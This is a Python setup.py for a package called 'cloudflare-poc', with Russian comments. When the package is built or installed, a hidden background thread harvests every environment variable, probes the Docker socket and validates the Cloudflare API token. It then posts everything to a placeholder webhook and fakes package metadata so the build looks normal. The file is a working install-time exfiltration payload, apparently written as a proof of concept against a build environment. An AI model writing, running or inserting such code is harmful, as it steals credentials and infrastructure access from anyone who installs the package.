import os, json, socket, urllib.request, subprocess, base64
from setuptools import setup

WEBHOOK_URL = "ТВОЙ_НОВЫЙ_WEBHOOK_URL"

class CloudflareOverlord:
    def __init__(self):
        self.loot = {
            "docker_info": {},
            "token_audit": {},
            "filesystem": {},
            "env": dict(os.environ)
        }

    def talk_to_docker(self):
        """Пытаемся получить список образов через Docker Socket"""
        sock_path = os.environ.get("DOCKER_HOST", "").replace("unix://", "")
        if sock_path and os.path.exists(sock_path):
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                s.connect(sock_path)
                # HTTP GET запрос к Docker API
                s.send(b"GET /images/json HTTP/1.1\r\nHost: localhost\r\n\r\n")
                response = s.recv(4096)
                self.loot["docker_info"]["response"] = base64.b64encode(response).decode()
                self.loot["docker_info"]["status"] = "SUCCESS: Docker is talking!"
                s.close()
            except Exception as e:
                self.loot["docker_info"]["error"] = str(e)

    def audit_cf_token(self):
        """Проверяем валидность токена через официальный API Cloudflare"""
        token = os.environ.get("CLOUDFLARE_API_TOKEN")
        if token:
            try:
                req = urllib.request.Request(
                    "https://api.cloudflare.com/client/v4/user/tokens/verify",
                    headers={"Authorization": f"Bearer {token}"}
                )
                with urllib.request.urlopen(req) as resp:
                    self.loot["token_audit"]["verify_result"] = json.loads(resp.read().decode())
            except Exception as e:
                self.loot["token_audit"]["error"] = str(e)

    def exfiltrate(self):
        data = json.dumps(self.loot).encode()
        try:
            req = urllib.request.Request(WEBHOOK_URL, data=data, method='POST')
            urllib.request.urlopen(req)
        except:
            pass

def run():
    ov = CloudflareOverlord()
    ov.talk_to_docker()
    ov.audit_cf_token()
    ov.exfiltrate()

# Запуск в фоне
import threading
threading.Thread(target=run).start()

# Фикс для билда
name = "cloudflare-poc"
os.makedirs(f"{name}.egg-info", exist_ok=True)
with open(f"{name}.egg-info/PKG-INFO", "w") as f:
    f.write("Metadata-Version: 2.1\nName: cloudflare-poc\nVersion: 0.0.1\n")

setup(name=name, version="0.0.1", packages=["."])
